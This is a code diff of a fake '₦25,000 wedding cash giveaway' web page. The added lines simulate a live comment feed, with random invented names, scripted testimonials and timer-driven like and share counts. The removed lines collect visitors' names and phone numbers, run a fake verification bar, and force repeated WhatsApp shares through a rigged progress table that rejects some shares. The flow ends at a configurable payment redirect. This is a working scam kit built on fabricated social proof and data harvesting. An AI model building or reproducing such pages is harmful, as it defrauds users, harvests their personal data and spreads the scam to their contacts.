+    const COLORS=["#f87171","#fbbf24","#34d399","#60a5fa","#a78bfa","#f472b6","#38bdf8","#fb923c","#4ade80","#c084fc"];
+    const COMMENTS=["I just completed my ₦25,000 cash giveaway registration. Waiting for the next update 🙏","My share progress updated after I returned from WhatsApp.","Congratulations to Peller and Jarvis ❤️ This is a beautiful celebration.","I have completed the steps and submitted my details successfully.","Who else is joining the ₦25,000 giveaway today? 🔥","I finished sharing to my WhatsApp groups. Waiting for review now.","The registration process was easy to follow on my phone.","My friend told me about this wedding giveaway, so I just joined.","I reached the final stage after returning from WhatsApp each time.","Good luck to everyone participating in the ₦25,000 cash giveaway.","I have completed my registration. Hope I get selected 🤞","The share button locked properly and updated when I came back.","What a lovely way to celebrate Peller and Jarvis 🎉","I just submitted mine now. Waiting for the final announcement.","I shared with my groups and the progress is moving gradually."];
+    const REPLIES=["Mine updated after I returned too.","Congratulations and good luck 🎉","I just completed mine as well.","Yes, you have to return to the page after each share.","I am waiting for the final review too.","The process worked smoothly for me.","Good luck everyone 🙏","I hope we all get selected.","I saw the same progress update on my phone.","Congratulations to the couple ❤️"];
+    const commentsEl=byId("liveComments"),typingEl=byId("liveTyping"),commentCountEl=byId("liveCommentCount"),likesEl=byId("liveLikes"),sharesEl=byId("liveShares");
+    let commentCount=0,likes=2418,shares=684,postLiked=false;const threads=[];const pick=a=>a[Math.floor(Math.random()*a.length)];const initials=n=>n.split(" ").map(x=>x[0]).slice(0,2).join("").toUpperCase();const color=n=>COLORS[Math.abs([...n].reduce((a,c)=>a+c.charCodeAt(0),0))%COLORS.length];
+    function updateLiveCounts(){commentCountEl.textContent=commentCount.toLocaleString();likesEl.textContent=likes.toLocaleString();sharesEl.textContent=shares.toLocaleString()+" shares";}
+    function actions(isReply,repliesEl){const wrap=document.createElement("div");wrap.className="comment-actions";const like=document.createElement("button");like.type="button";like.textContent="Like";let liked=false;like.onclick=()=>{liked=!liked;like.classList.toggle("liked",liked);};wrap.append(like);if(!isReply){const reply=document.createElement("button");reply.type="button";reply.textContent="Reply";reply.onclick=()=>{const text=prompt("Write a reply:");if(text&&text.trim())addComment("You",text.trim(),true,repliesEl);};wrap.append(document.createTextNode("·"),reply);}wrap.append(document.createTextNode("· Just now"));return wrap;}
+    function addComment(name,text,isReply=false,target=null){const row=document.createElement("div");row.className="comment-row"+(isReply?" reply":"");const avatar=document.createElement("div");avatar.className="avatar";avatar.style.background=color(name);avatar.textContent=initials(name);const col=document.createElement("div");col.className="comment-col";const bubble=document.createElement("div");bubble.className="bubble";const n=document.createElement("span");n.className="comment-name";n.textContent=name;const t=document.createElement("span");t.className="comment-text";t.textContent=text;bubble.append(n,t);col.append(bubble);let repliesEl=target;if(!isReply){repliesEl=document.createElement("div");repliesEl.className="replies";col.append(actions(false,repliesEl),repliesEl);}else col.append(actions(true));row.append(avatar,col);if(isReply&&target)target.append(row);else{commentsEl.prepend(row);threads.unshift(repliesEl);if(threads.length>30)threads.pop();}commentCount++;updateLiveCounts();return repliesEl;}
+    function simulate(){const name=pick(NAMES);typingEl.textContent=name+" is typing…";setTimeout(()=>{typingEl.textContent="";if(threads.length&&Math.random()<.35)addComment(name,pick(REPLIES),true,pick(threads.slice(0,Math.min(4,threads.length))));else addComment(name,pick(COMMENTS));},850+Math.random()*1100);}
+    [["Aisha Bello",COMMENTS[0]],["Chinedu Okafor",COMMENTS[1]],["Blessing Eze",COMMENTS[2]],["David Ojo",COMMENTS[3]],["Zainab Garba",COMMENTS[9]]].reverse().forEach(x=>addComment(x[0],x[1]));addComment("Mercy Johnson",REPLIES[0],true,threads[1]);addComment("Samuel Adewale",REPLIES[2],true,threads[3]);
+    byId("liveComposer").addEventListener("submit",e=>{e.preventDefault();const input=byId("liveInput"),v=input.value.trim();if(!v)return;addComment("You",v);input.value="";commentsEl.scrollTop=0;});byId("liveCommentBtn").onclick=()=>byId("liveInput").focus();byId("liveLikeBtn").onclick=e=>{postLiked=!postLiked;likes+=postLiked?1:-1;e.currentTarget.classList.toggle("active",postLiked);updateLiveCounts();};byId("liveShareBtn").onclick=()=>{shares++;updateLiveCounts();};
+    setInterval(()=>{if(Math.random()<.7){likes++;updateLiveCounts();}},5200);setInterval(()=>{if(Math.random()<.35){shares++;updateLiveCounts();}},9800);setTimeout(function loop(){simulate();setTimeout(loop,3000+Math.random()*1800);},1800);updateLiveCounts();
+  })();
+  </script>
 
-  byId("confirm").addEventListener("click", () => {
-    const fullName = byId("fullName").value.trim();
-    const phoneNumber = onlyDigits(byId("phoneNumber").value);
-    if (fullName.length < 3 || phoneNumber.length < 10 || phoneNumber.length > 14) {
-      byId("formError").style.display = "block";
-      return;
-    }
-    byId("formError").style.display = "none";
-    sessionStorage.setItem("pellerJarvisName", fullName);
-    sessionStorage.setItem("pellerJarvisPhone", phoneNumber);
-    byId("getname").textContent = fullName;
-    setActiveStep("verify");
-    show("checking");
-
-    let progress = 0;
-    const timer = setInterval(() => {
-      progress += 1;
-      byId("percentage").textContent = progress + "%";
-      byId("fill").style.width = progress + "%";
-      if (progress >= 100) {
-        clearInterval(timer);
-        setTimeout(() => {
-          renderShare();
-          if (shareProgress >= 100) {
-            setActiveStep("complete");
-            show("claim");
-          } else {
-            setActiveStep("share");
-            show("share");
-          }
-        }, 300);
-      }
-    }, 25);
-  });
-
-  function renderShare(){
-    shareProgress = Math.max(0, Math.min(100, shareProgress));
-    byId("fill2").style.width = shareProgress + "%";
-    byId("percentage2").textContent = shareProgress + "%";
-    if (shareProgress >= 100) {
-      setActiveStep("complete");
-      show("claim");
-    }
-  }
-
-  function buildShareText(){
-    const pageUrl = location.href.split("#")[0];
-    return [
-      "*Peller and Jarvis' 2026 Wedding Celebration Cash Giveaway*",
-      "",
-      "Join us as we celebrate their wedding and register for the ₦25,000 Cash Giveaway.",
-      "",
-      "Register here 👇",
-      pageUrl
-    ].join("\n");
-  }
-
-  const SHARE_STEPS = [
-    {increment:50,counted:true},
-    {increment:0,counted:false},
-    {increment:15,counted:true},
-    {increment:5,counted:true},
-    {increment:0,counted:false},
-    {increment:10,counted:true},
-    {increment:5,counted:true},
-    {increment:0,counted:false},
-    {increment:5,counted:true},
-    {increment:3,counted:true},
-    {increment:2,counted:true},
-    {increment:2,counted:true},
-    {increment:1,counted:true},
-    {increment:1,counted:true},
-    {increment:1,counted:true}
-  ];
-
-  function setShareFeedback(type,message){
-    const box = byId("shareFeedback");
-    box.className = "share-feedback " + type;
-    box.textContent = message;
-  }
-
-  function setShareButtonLocked(locked){
-    const button = byId("whatsapp");
-    button.disabled = locked;
-    button.style.opacity = locked ? ".65" : "1";
-    button.style.cursor = locked ? "not-allowed" : "pointer";
-    button.innerHTML = locked ? '<font color="white">PLEASE WAIT...</font>' : '<font color="white">SHARE</font>';
-  }
-
-  function completePendingShare(){
-    const pending = sessionStorage.getItem(SHARE_PENDING_KEY) === "1";
-    const leftPage = sessionStorage.getItem(SHARE_LEFT_KEY) === "1";
-    if (!pending || !leftPage) return;
-
-    sessionStorage.removeItem(SHARE_PENDING_KEY);
-    sessionStorage.removeItem(SHARE_LEFT_KEY);
-
-    const currentStep = Number(localStorage.getItem(STORAGE_KEY + "Step") || 0);
-    const step = SHARE_STEPS[Math.min(currentStep, SHARE_STEPS.length - 1)];
-    localStorage.setItem(STORAGE_KEY + "Step", String(currentStep + 1));
-
-    if (step.counted) {
-      shareProgress = Math.min(100, shareProgress + step.increment);
-      localStorage.setItem(STORAGE_KEY, String(shareProgress));
-      setShareFeedback("ok", "Share activity recorded after you returned from WhatsApp.");
-    } else {
-      setShareFeedback("fail", "This share attempt was not counted yet. Choose another contact or group on your next attempt.");
-    }
-
-    renderShare();
-    if (shareProgress < 100) setShareButtonLocked(false);
-  }
-
-  document.addEventListener("visibilitychange", () => {
-    if (sessionStorage.getItem(SHARE_PENDING_KEY) !== "1") return;
-    if (document.visibilityState === "hidden") {
-      sessionStorage.setItem(SHARE_LEFT_KEY, "1");
-    } else if (document.visibilityState === "visible") {
-      completePendingShare();
-    }
-  });
-
-  window.addEventListener("pagehide", () => {
-    if (sessionStorage.getItem(SHARE_PENDING_KEY) === "1") {
-      sessionStorage.setItem(SHARE_LEFT_KEY, "1");
-    }
-  });
-  window.addEventListener("pageshow", completePendingShare);
-  window.addEventListener("focus", completePendingShare);
-
-  byId("whatsapp").addEventListener("click", () => {
-    if (sessionStorage.getItem(SHARE_PENDING_KEY) === "1") return;
-
-    sessionStorage.setItem(SHARE_PENDING_KEY, "1");
-    sessionStorage.removeItem(SHARE_LEFT_KEY);
-    setShareButtonLocked(true);
-    setShareFeedback("ok", "Opening WhatsApp. Your progress will update once after you leave this page and return.");
-
-    const shareUrl = "https://wa.me/?text=" + encodeURIComponent(buildShareText());
-    window.location.href = shareUrl;
-  });
-
-  function openConfiguredUrl(url,fallbackMessage){
-    if (url) {
-      window.location.href = url;
-    } else {
-      alert(fallbackMessage);
-    }
-  }
-
-  byId("continueButton").addEventListener("click", () => {
-    openConfiguredUrl(OFFER_CONFIG.continueUrl,"Add your CONTINUE URL inside OFFER_CONFIG.continueUrl.");
-  });
-  byId("paymentButton").addEventListener("click", () => {
-    openConfiguredUrl(OFFER_CONFIG.paymentUrl,"Add your payment URL inside OFFER_CONFIG.paymentUrl.");
-  });
-  byId("statusButton").addEventListener("click", () => {
-    openConfiguredUrl(OFFER_CONFIG.statusUrl,"Add your status URL inside OFFER_CONFIG.statusUrl.");
-  });
-
-  const savedName = sessionStorage.getItem("pellerJarvisName");
-  if (savedName) byId("getname").textContent = savedName;
-  renderShare();
-  if (sessionStorage.getItem(SHARE_PENDING_KEY) === "1") {
-    setShareButtonLocked(true);
-  }
-  completePendingShare();
-})();
-</script>
-  <!-- BEGIN: Powered by Supercounters.com -->
-<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1736868,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+  <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1736868,"ffffff","ffffff");</script></center>
 </body>
 </html>
